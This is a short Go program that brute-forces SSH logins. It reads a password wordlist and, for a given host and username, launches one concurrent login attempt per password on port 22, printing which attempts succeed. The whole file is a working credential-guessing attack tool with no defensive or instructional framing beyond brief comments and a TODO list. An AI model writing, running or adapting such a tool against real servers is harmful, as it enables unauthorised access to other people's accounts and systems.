package main

import (
	"golang.org/x/crypto/ssh"
	"fmt"
	"os"
	"bufio"
)

/*
TODO:
Stop goroutines on correcet pass
Benchmarks?
*/

type Target struct {
	usr string
	host string
}

type Pass struct {
	ok bool
	pass string
}

// ReadList scans word list into slice.
func ReadList(path string) ([]string, error) {
	// Read File
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close() // remember to close
	var lines []string
	// start scanning
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

// Connex attempts to login to ssh.
func Connex(pss, hst, usr string) (Pass){
	config := &ssh.ClientConfig{
		User: usr,
		Auth: []ssh.AuthMethod{
			ssh.Password(pss),
		},
	}
	// Dial your ssh server.
	conn, err := ssh.Dial("tcp", hst+":22", config)
	if err != nil {
		return Pass{false, pss}
	} else {
		conn.Close()
		return Pass{true, pss}
	}
}

func main() {
	args := os.Args[1:]
	host := args[0]
	user := args[1]
	wordList := args[2]
	// Read Password list
	passList, err := ReadList(wordList)
	if err != nil {
		fmt.Printf("List unavailable: [%s]", err)
		return
	}
	// Check for valid Passwords
	passChan := make(chan Pass)
	for _, p := range passList {
		go func(password string) {
			result := Connex(password, host, user)
			passChan<-result
		}(p)
	}
	//Read the Channels
	for i := 0; i < len(passList); i++ {
		res := <-passChan
		fmt.Println(res)
	}
}
